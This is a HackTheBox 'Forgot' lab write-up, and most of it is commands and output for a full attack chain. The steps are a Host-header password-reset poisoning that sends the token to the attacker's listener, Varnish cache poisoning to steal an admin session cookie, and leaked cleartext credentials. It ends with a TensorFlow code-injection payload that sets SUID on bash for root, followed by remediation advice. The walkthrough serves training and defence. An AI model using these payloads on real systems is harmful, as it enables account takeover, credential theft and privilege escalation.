--- 
title: "HTB Forgot | Linux - Medium"
author: "Samuel Nwoye"
date: 2023-04-02T08:58:00+02:00
description: ""
draft: true
disableComments: false
categories: ["security"]
series: [] #Taxonomy to list "See Also" Section in Opengraph Templates
tags: ["infrastructure","code injection", "cache poisoning", "password reset poisoning"]
slug: ""
summary: ""
---
HackTheBox Forgot is a Linux machine rated Medium. Flawed with security misconfiguration(A05:2021), identification and authentication failures(A07:2021), vulnerable and outdated components(A06:2021), and injection(A03:2021).

Attack Workflow: Leverage Host header attack in exploiting the password reset vulnerability. Take advantage of the varnish cache misconfiguration in executing a web cache poisoning attack. Exploit a vulnerable component using code injection attack to gain root privilege. 

##### Initialization
```bash
# connect to vpn
sudo openvpn --auth-nocache --config lab_connection.ovpn
``` 

##### Enumeration
```bash
# discover ports and services
nmap -sC -sV  -vvv -oA nmap_forgot 10.10.11.188
xsltproc nmap_forgot.xml -o nmap_forgot.html             # converts xml to html
firefox nmap_forgot.html                                 # view in browser
#--snip--#
22/tcp OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 
80/tcp http Werkzeug/2.1.2 Python/3.8.10 (GET HEAD OPTIONS)

# discover technologies used
whatweb 10.10.11.188
#--snip--#
HTTPServer[Werkzeug/2.1.2 Python/3.8.10]
Python[3.8.10]
Varnish, Via-Proxy[1.1 varnish (Varnish/6.2)]
Werkzeug[2.1.2]
``` 

```bash
# discover directories
# with ffuf
ffuf -c -u http://10.10.11.188/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -t 50 -ac
#--snip--#
/login     200        
/home      302     
/tickets   302       
/forgot    200
/reset     200
/escalate  302

# with gobuster
gobuster dir -u http://10.10.11.188/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -t25
#--snip--#
/login     200
/home      302
/tickets   302
/forgot    200
/reset     200

# with dirsearch
dirsearch -u http://10.10.11.188/ -t 30 -r
#--snip--#
/forgot   200
/home     302
/login    200
/reset    200       

# with wfuzz
wfuzz -z file,/usr/share/seclists/Discovery/Web-Content/common.txt --hc 404 -t 50 http://10.10.11.188/FUZZ
#--snip--#
/home    302
/login   200
/forgot  200
/tickets 302
```

##### Exploration
Tried several manual passwords using admin username with no result. Started Burp suite, investigated the site and discovered the comment, `<!-- Q1 release fix by robert-dev-87120 -->`, which appears to be populated dynamically. Copied the exact username for a specific session and again tried several passwords to gain entrance but was unsuccessful. Then used the 'forgot the password' in order to reset this particular user's password.

![Reset Password](/images/forgot/forgot01.png "Reset Password")

##### Exploitation
Our initial enumeration did not show a mail service. How can we get this link and reset this user's password and gain access to the application? Let's intercept this path in Burp suite and send to Repeater.
![Intercept Forgot URL](/images/forgot/forgot02.png "Intercept Forgot URL")

Could this application be vulnerable to [password reset poisoning?](https://www.invicti.com/learn/password-reset-poisoning/) Investigated and found that the site was [Host header injectible](https://www.invicti.com/learn/host-header-attacks/). Let's redirect the password reset request to our attacking machine so that once the user clicks the link sent to their email we grab the request.
```shell
curl -s -I http://10.10.11.188 -H 'Host: 10.10.14.87'   # verify Host header injection
#--snip--#
HTTP/1.1 302 FOUND
Server: Werkzeug/2.1.2 Python/3.8.10
Date: Sat, 18 Mar 2023 06:36:12 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 223
Location: http://10.10.14.87
X-Varnish: 33339
Age: 0
Via: 1.1 varnish (Varnish/6.2)
Connection: keep-alive
```
This application blindly trusts the client-controlled Host header input against using the server-controlled Server_Name header. Thus we set up a server or listener and intercept the reset link.
```shell
# start a local server and repeat the request on Burp with your local server endpoint as the Host value. see forgot03
php -S 10.10.14.87:8001 

# you can alternatively send a request using the terminal
curl 'http://10.10.11.188/forgot?username=robert-dev-87120' -H 'Host: 10.10.14.87:8001'
```
![Host Header Injection](/images/forgot/forgot03.png "Host Header Injection")

Now use this token and reset the password from the browser to a new password: `P@sSw0r)`
![Reset User Password](/images/forgot/forgot04.png "Reset User Password")

Investigated all the tabs on the logged-in page. On the Tickets tab noticed a ticket 'SSH Credentials are not working for Jenkins Slave machine' reported by 'Diego (Devops Lead)' in 'Escalated' status. On the Escalate tab we see the form for submitting tickets. The Tickets(escalated) tab is disabled which on inspection shows it maps to `/admin_tickets` with an anchor tag `class="disabled"`. Intercepted the `/escalation` page and investigated it. From existing knowledge Host header attack works on some vulnerability type of which [web cache poisoning](https://www.invicti.com/learn/web-cache-poisoning/) is one and the application uses varnish cache.

![Forgot Ticket and Escalate Tabs](/images/forgot/forgot05.png "Forgot Ticket and Escalate Tabs")

![Intercept Escalate URL](/images/forgot/forgot06.png "Intercept Escalate URL")

Our enumeration revealed the application is using a [varnish cache](https://varnish-cache.org/intro/index.html#the-basics). Searched for varnish cache exploits and found [exploiting cache design flaw](https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws), and [web cache poisoning](https://portswigger.net/web-security/web-cache-poisoning). Burp suite showed us a `/static` endpoint and cache are focused on storing static pages. Noticed that the application caches a non-existent page. We will craft a non-existent URL say `/static/error.png` or `/static/admin.css` and raise a ticket using the URL as the value for the Link box. Hopefully, the admin will click the link to understand our issue which inadvertently caches it such that when we visit the same link the returned content will contain the cookie of the admin since the application is serving us the cached content of the user that first visited the site.
```bash
# after the admin must have clicked the link, request the URL again and get the admin cookie
curl -s -I http://10.10.11.188/static/payload.css
#--snip--#
HTTP/1.1 404 NOT FOUND
Server: Werkzeug/2.1.2 Python/3.8.10
Date: Sat, 18 Mar 2023 10:08:01 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 207
Set-Cookie: session=0bcdf31d-00fe-44c9-acb6-e074d478cec7; HttpOnly; Path=/
cache-control: public, max-age=240
X-Varnish: 327750 163926
Age: 1193
Via: 1.1 varnish (Varnish/6.2)
Connection: keep-alive

# request the disabled /admin_tickets with above cookie. you can also use the browser. see forgot09
curl http://10.10.11.188/admin_tickets -H 'Cookie: session=0bcdf31d-00fe-44c9-acb6-e074d478cec7' | html2text      # see forgot08
<<SNIP
****** Admin Tickets ******
Issue               Reported By         Link               Reason
                                                           I've tried with
SSH Credentials are                                        diego:dCb#1!x0%gjq.
not working for                         http://forgot.htb/ The automation tasks
Jenkins Slave       Diego (Devops Lead) tickets/102        has been blocked due
machine                                                    to this issue.
                                                           Please resolve this
                                                           at the earliest
SNIP

# log in via ssh
ssh diego@10.10.11.188      # on prompt submit: dCb#1!x0%gjq
ls -l
#--snip--#
total 16
drwxrw-r-- 5 diego diego 4096 Nov 16 15:04 app
-rwxr-xr-x 1 root  root   970 Nov 14 15:45 bot.py
drwx------ 3 diego diego 4096 Nov  3 14:56 snap
-rw-r----- 1 diego diego   33 Mar 18 09:50 user.txt

cat user.txt    # capture the user flag
```

![Submit a Payload](/images/forgot/forgot07.png "Submit a Payload")

![Grab Diego's Credentials](/images/forgot/forgot08.png "Grab Diego's Credentials")

![Browser Display of Diego's Credentials](/images/forgot/forgot09.png "Browser Display of Diego's Credentials")

##### Escalation
```shell
cat bot.py      # show contents # see bot.py
id              # list current user details
#--snip--#
uid=1000(diego) gid=1000(diego) groups=1000(diego)

sudo -l         # user's sudo rights
<<SNIP
Matching Defaults entries for diego on forgot:
    env_reset, mail_badpass,
secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
User diego may run the following commands on forgot:
    (ALL) NOPASSWD: /opt/security/ml_security.py
SNIP

cat /etc/passwd | grep -i "sh$"	     # get users with shell
#--snip--#
root:x:0:0:root:/root:/bin/bash
diego:x:1000:1000:,,,:/home/diego:/bin/bash

ss -tpn                              # show tcp connections
#--snip--#
State    Recv-Q Send-Q   Local Address:Port    Peer Address:Port  Process                            
ESTAB    0      0         10.10.11.188:22       10.10.16.18:54088                                    
ESTAB    0      0         10.10.11.188:22       10.10.16.18:36572                                    
ESTAB    0      0            127.0.0.1:3306       127.0.0.1:55682                                    
ESTAB    0      36        10.10.11.188:22       10.10.14.87:43238                                    
ESTAB    0      0            127.0.0.1:55682      127.0.0.1:3306   users:(("python3",pid=1842,fd=3)) 
SYN-SENT 0      1         10.10.11.188:44334        1.1.1.1:53   


ls -lah /opt/security/ml_security.py
<<SNIP
-rwxr-xr-x 1 root root 5.6K Nov 14 15:32 /opt/security/ml_security.py
SNIP

cd /opt/security       # change to the script parent directory
cat ml_security.py     # show content and use Chat-GPT to understand see ml_security.py and chat-gpt-response
```

[bot.py](#bot.py)
```python
#!/usr/bin/python3
import os
import mysql.connector
import requests
import netifaces as ni

# Fetch Links
conn = mysql.connector.connect(host="localhost",database="app",user="diego",password="dCb#1!x0%gjq")
cursor = conn.cursor()
cursor.execute('select * from forgot')
r = cursor.fetchall()

# Open reset links
for i in r:
	try:
		requests.get(i[1],timeout=10)
	except:
		pass

# Open tickets as admin
cursor.execute('select * from escalate')
r = cursor.fetchall()
tun_ip = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']
d = requests.post(f'http://{tun_ip}/login',data={'username':'admin','password':'dCvbgFh345_368352c@!'})
cookie = d.headers['Set-Cookie'].split('=')[1].split(';')[0]

for i in r:
	try:
		print(i[2])
		requests.get(i[2],cookies={'session':cookie})
		requests.get(i[2],cookies={'session':cookie})
		requests.get(i[2],cookies={'session':cookie})
		cursor.execute('delete from escalate where link=%s',(i[2],))
		conn.commit()
	except:
		pass
conn.close()
```

[ml_security.py](ml_security.py)
```python
#!/usr/bin/python3
import sys
import csv
import pickle
import mysql.connector
import requests
import threading
import numpy as np
import pandas as pd
import urllib.parse as parse
from urllib.parse import unquote
from sklearn import model_selection
from nltk.tokenize import word_tokenize
from sklearn.linear_model import LogisticRegression
from gensim.models.doc2vec import Doc2Vec, TaggedDocument
from tensorflow.python.tools.saved_model_cli import preprocess_input_exprs_arg_string

np.random.seed(42)

f1 = '/opt/security/lib/DecisionTreeClassifier.sav'
f2 = '/opt/security/lib/SVC.sav'
f3 = '/opt/security/lib/GaussianNB.sav'
f4 = '/opt/security/lib/KNeighborsClassifier.sav'
f5 = '/opt/security/lib/RandomForestClassifier.sav'
f6 = '/opt/security/lib/MLPClassifier.sav'

# load the models from disk
loaded_model1 = pickle.load(open(f1, 'rb'))
loaded_model2 = pickle.load(open(f2, 'rb'))
loaded_model3 = pickle.load(open(f3, 'rb'))
loaded_model4 = pickle.load(open(f4, 'rb'))
loaded_model5 = pickle.load(open(f5, 'rb'))
loaded_model6 = pickle.load(open(f6, 'rb'))
model= Doc2Vec.load("/opt/security/lib/d2v.model")

# Create a function to convert an array of strings to a set of features
def getVec(text):
    features = []
    for i, line in enumerate(text):
        test_data = word_tokenize(line.lower())
        v1 = model.infer_vector(test_data)
        featureVec = v1
        lineDecode = unquote(line)
        lowerStr = str(lineDecode).lower()
        feature1 = int(lowerStr.count('link'))
        feature1 += int(lowerStr.count('object'))
        feature1 += int(lowerStr.count('form'))
        feature1 += int(lowerStr.count('embed'))
        feature1 += int(lowerStr.count('ilayer'))
        feature1 += int(lowerStr.count('layer'))
        feature1 += int(lowerStr.count('style'))
        feature1 += int(lowerStr.count('applet'))
        feature1 += int(lowerStr.count('meta'))
        feature1 += int(lowerStr.count('img'))
        feature1 += int(lowerStr.count('iframe'))
        feature1 += int(lowerStr.count('marquee'))
        # add feature for malicious method count
        feature2 = int(lowerStr.count('exec'))
        feature2 += int(lowerStr.count('fromcharcode'))
        feature2 += int(lowerStr.count('eval'))
        feature2 += int(lowerStr.count('alert'))
        feature2 += int(lowerStr.count('getelementsbytagname'))
        feature2 += int(lowerStr.count('write'))
        feature2 += int(lowerStr.count('unescape'))
        feature2 += int(lowerStr.count('escape'))
        feature2 += int(lowerStr.count('prompt'))
        feature2 += int(lowerStr.count('onload'))
        feature2 += int(lowerStr.count('onclick'))
        feature2 += int(lowerStr.count('onerror'))
        feature2 += int(lowerStr.count('onpage'))
        feature2 += int(lowerStr.count('confirm'))
        # add feature for ".js" count
        feature3 = int(lowerStr.count('.js'))
        # add feature for "javascript" count
        feature4 = int(lowerStr.count('javascript'))
        # add feature for length of the string
        feature5 = int(len(lowerStr))
        # add feature for "<script"  count
        feature6 = int(lowerStr.count('script'))
        feature6 += int(lowerStr.count('<script'))
        feature6 += int(lowerStr.count('&lt;script'))
        feature6 += int(lowerStr.count('%3cscript'))
        feature6 += int(lowerStr.count('%3c%73%63%72%69%70%74'))
        # add feature for special character count
        feature7 = int(lowerStr.count('&'))
        feature7 += int(lowerStr.count('<'))
        feature7 += int(lowerStr.count('>'))
        feature7 += int(lowerStr.count('"'))
        feature7 += int(lowerStr.count('\''))
        feature7 += int(lowerStr.count('/'))
        feature7 += int(lowerStr.count('%'))
        feature7 += int(lowerStr.count('*'))
        feature7 += int(lowerStr.count(';'))
        feature7 += int(lowerStr.count('+'))
        feature7 += int(lowerStr.count('='))
        feature7 += int(lowerStr.count('%3C'))
        # add feature for http count
        feature8 = int(lowerStr.count('http'))
        
        # append the features
        featureVec = np.append(featureVec,feature1)
        featureVec = np.append(featureVec,feature2)
        featureVec = np.append(featureVec,feature3)
        featureVec = np.append(featureVec,feature4)
        featureVec = np.append(featureVec,feature5)
        featureVec = np.append(featureVec,feature6)
        featureVec = np.append(featureVec,feature7)
        featureVec = np.append(featureVec,feature8)
        features.append(featureVec)
    return features


# Grab links
conn = mysql.connector.connect(host='localhost',database='app',user='diego',password='dCb#1!x0%gjq')
cursor = conn.cursor()
cursor.execute('select reason from escalate')
r = [i[0] for i in cursor.fetchall()]
conn.close()
data=[]
for i in r:
        data.append(i)
Xnew = getVec(data)

#1 DecisionTreeClassifier
ynew1 = loaded_model1.predict(Xnew)
#2 SVC
ynew2 = loaded_model2.predict(Xnew)
#3 GaussianNB
ynew3 = loaded_model3.predict(Xnew)
#4 KNeighborsClassifier
ynew4 = loaded_model4.predict(Xnew)
#5 RandomForestClassifier
ynew5 = loaded_model5.predict(Xnew)
#6 MLPClassifier
ynew6 = loaded_model6.predict(Xnew)

# show the sample inputs and predicted outputs
def assessData(i):
    score = ((.175*ynew1[i])+(.15*ynew2[i])+(.05*ynew3[i])+(.075*ynew4[i])+(.25*ynew5[i])+(.3*ynew6[i]))
    if score >= .5:
        try:
                preprocess_input_exprs_arg_string(data[i],safe=False)
        except:
                pass

for i in range(len(Xnew)):
     t = threading.Thread(target=assessData, args=(i,))
#     t.daemon = True
     t.start()
```

[chat-gpt-response](#chat-gpt-response)
```text
The code seems to be a Python script that loads pre-trained machine learning models and uses them to make predictions on a set of input data. The script imports several libraries, including `sys`, `csv`, `pickle`, `mysql.connector`, `requests`, `threading`, `numpy`, `pandas`, `urllib`, `sklearn`, `nltk`, `gensim`, and `tensorflow`.

The script then loads pre-trained machine learning models using `pickle.load()`, which loads previously saved models from disk. There are six machine learning models loaded, including `DecisionTreeClassifier`, `SVC`, `GaussianNB`, `KNeighborsClassifier`, `RandomForestClassifier`, and `MLPClassifier`.

The script then defines a function called `getVec()` that takes an array of strings as input and returns a set of features for each string. The function uses `gensim.models.doc2vec.Doc2Vec` to compute document embeddings for each string, which are then combined with several other features. These features include the count of various HTML tags and malicious methods, the count of ".js" and "javascript" strings, the length of the input string, the count of "<script" tags, the count of special characters, and the count of "http" strings. The resulting features are returned as a list of numpy arrays.

The script then connects to a MySQL database and retrieves a set of strings to use as input to the `getVec()` function. The resulting features are then used to make predictions using each of the pre-trained machine learning models loaded earlier. Specifically, the script makes predictions using the `predict()` method for each model, passing in the features computed by `getVec()` as input.

It is unclear what the overall purpose of the script is or what kind of data it is processing. The script may be part of a larger system that is used to detect malicious web traffic or other security-related tasks.
```

Usually when an engagement involves reading source code, focus on searching for the vulnerabilities in the library and functions employed in the code, after fairly understanding the code. You can use google, or take a look at the functions documentation. Now keep in mind that you cannot edit the `ml_security.py` script. You have to look for another entry point. Read the linked references to understand the several functions used within the code: [gensim.models.doc2vec](https://radimrehurek.com/gensim/models/doc2vec.html) [pickle](https://omz-software.com/editorial/docs/library/pickle.html) [word_tokenize](https://www.educative.io/answers/what-is-wordtokenize-in-python). Found that the `tensorflow.python.tools.saved_model_cli` was code injectable see [TensorFlow Python Code Injection: More eval() Woes](https://jfrog.com/blog/tensorflow-python-code-injection-more-eval-woes/), and [Code injection in `saved_model_cli` in TensorFlow](https://github.com/advisories/GHSA-75c9-jrh4-79mc)
```shell
# check tensorflow version
pip freeze | grep tensorflow   # for details use: pip show tensorflow
#--snip--#
tensorflow==2.6.3

# explore the escalate table in app database
mysql -h localhost -u diego -p'dCb#1!x0%gjq' app
show databases;
show tables;
select * from escalate;    # it is empty
describe escalate;
<<COMMENT
+--------+------+------+-----+---------+-------+
| Field  | Type | Null | Key | Default | Extra |
+--------+------+------+-----+---------+-------+
| user   | text | YES  |     | NULL    |       |
| issue  | text | YES  |     | NULL    |       |
| link   | text | YES  |     | NULL    |       |
| reason | text | YES  |     | NULL    |       |
+--------+------+------+-----+---------+-------+
COMMENT

insert into escalate values ("diego","failure","localhost",'inject=exec("""\nimport os\nos.system("chmod +s /usr/bin/bash")""")');
exit

# back on normal terminal
sudo /opt/security/ml_security.py
bash -p
id
cat /root/root.txt     # capture the root flag
```

##### Remediation
**Fixing the Foothold Vector**  
On an employee level, the user Diego should never have shared his credentials via that medium. There are several tools for sharing sensitive credentials e.g keybase. Some of these tools destroy the credentials after the first read. The Tickets(escalated) tab was disabled so that only admins can access it. Notice that if you logged in with the admin credentials looted from the bot.py it shows 'Logged In As Robert' navigating to the `/admin_tickets` then shows 'Logged In As Admin' and the Tickets(Escalated) tab remained disabled. There are quite some flaws with this application. However, focusing on the infrastructure end there is one fundamental mistake the administrator made in the varnish configuration i.e allowing the session cookie to be returned on the cached content.
```shell
# show running services
systemctl list-units --no-pager --type=service --state=running  # note: varnish.service 

# view service status and configuration
systemctl status varnish.service
cat /lib/systemd/system/varnish.service
cd /etc/varnish/                            # varnish configuration folder
ls -la
#--snip--#
-rw-r--r--   1 root root  354 Nov  7 11:15 default.vcl
-rw-------   1 root root   37 Jun 24  2022 secret
```

[/lib/systemd/system/varnish.service](#varnish%20service%20configuration)
```text
[Unit]
Description=Varnish HTTP accelerator
Documentation=https://www.varnish-cache.org/docs/6.1/ man:varnishd

[Service]
Type=simple
LimitNOFILE=131072
LimitMEMLOCK=82000
ExecStart=/usr/sbin/varnishd -j unix,user=vcache -F -a :80 -T localhost:6082 -f /etc/varnish/default.vcl -S /etc/varnish/secret -s malloc,256m
ExecReload=/usr/share/varnish/varnishreload
ProtectSystem=full
ProtectHome=true
PrivateTmp=true
PrivateDevices=true

[Install]
WantedBy=multi-user.target
```

[default.vcl](#varnish%20default%20config)
```vcl
vcl 4.0;

backend default {
    .host = "127.0.0.1";
    .port = "8080";
}

sub vcl_recv {
	if (req.url ~ "/static") {
	    return (hash);
	}
}

sub vcl_backend_response {
	if (bereq.url ~ "/static") {
	        set beresp.http.cache-control = "public, max-age=240";
	        set beresp.ttl = 1d;
	        return (deliver);
	    }
}

sub vcl_deliver {
}

```

In the below block notice that the user's session cookie was included in the response
```shell
curl -s -I http://10.10.11.188/static/paydz.css -H 'Cookie: session=9556b044-a67a-4b7b-bceb-f587a886aec6'
#--snip--##
HTTP/1.1 404 NOT FOUND
Server: Werkzeug/2.1.2 Python/3.8.10
Date: Sun, 19 Mar 2023 17:50:11 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 207
Set-Cookie: session=9556b044-a67a-4b7b-bceb-f587a886aec6; HttpOnly; Path=/
cache-control: public, max-age=240
X-Varnish: 65573
Age: 0
Via: 1.1 varnish (Varnish/6.2)
Connection: keep-alive

```

After [fixing this issue](https://www.varnish-software.com/developers/tutorials/removing-cookies-varnish/#removing-the-set-cookie-header-for-static-files) on the varnish server with the displayed fixed default.vcl, observe that the session cookie is no longer returned when `/static` is requested.
[fixed default.vcl](#fixed%20varnish%20default%20config)
```vcl
vcl 4.0;

backend default {
    .host = "127.0.0.1";
    .port = "8080";
}

sub vcl_recv {
    # Disable Host and X-Forwarded-Host headers 
    unset req.http.Host; 
    unset req.http.X-Forwarded-Host;

    # Force Location header 
    if (req.http.host) { 
        set req.http.Location = "http://" + req.http.host + req.url; 
        return(synth(200, "")); 
    }
    
	if (req.url ~ "/static") {
	    return (hash);
	}
}

sub vcl_synth { 
    if (resp.status == 200) { 
        set resp.http.Location = req.http.Location; 
        set resp.status = 302; 
        return(deliver); 
    } 
}

sub vcl_backend_response {
	if (bereq.url ~ "/static") {
	        set beresp.http.cache-control = "public, max-age=240";
	        set beresp.ttl = 1d;
	        unset beresp.http.Set-Cookie;
	        return (deliver);
	    }
}

sub vcl_deliver {
}
```

```shell
curl -s -I http://10.10.11.188/static/padz.css -H 'Cookie: session=9556b044-a67a-4b7b-bceb-f587a886aec6'
#--snip--#
HTTP/1.1 404 NOT FOUND
Server: Werkzeug/2.1.2 Python/3.8.10
Date: Sun, 19 Mar 2023 18:00:55 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 207
cache-control: public, max-age=240
X-Varnish: 32782
Age: 0
Via: 1.1 varnish (Varnish/6.2)
Connection: keep-alive
```

**Fixing the Privilege Escalation Vector**
```shell
# upgrade tensorflow dependencies
pip install --upgrade tensorflow==2.7.2 tensorflow-estimator==2.7.2
```

##### Other References
[Guide to Python Pickle](https://snyk.io/blog/guide-to-python-pickle/) [Exploiting Insecure Deserialization bugs found in the Wild (Python Pickles)](https://macrosec.tech/index.php/2021/06/29/exploiting-insecuredeserialization-bugs-found-in-the-wild-python-pickles/) [Practical Web Cache Poisoning pdf - James Kettle](https://i.blackhat.com/us-18/Thu-August-9/us-18-Kettle-Practical-Web-Cache-Poisoning-Redefining-Unexploitable.pdf) [Practical Web Cache Poisoning youtube- James Kettle](https://www.youtube.com/watch?v=j2RrmNxJZ5c) [Code Injection Attack](https://www.invicti.com/learn/remote-code-execution-rce/)  
  
    
---  
>I build secure and reliable infrastructures, hunt for flaws in insecure systems and remediate them to meet compliance. Book a consultation [session](https://calendly.com/samuelnwoye/10min).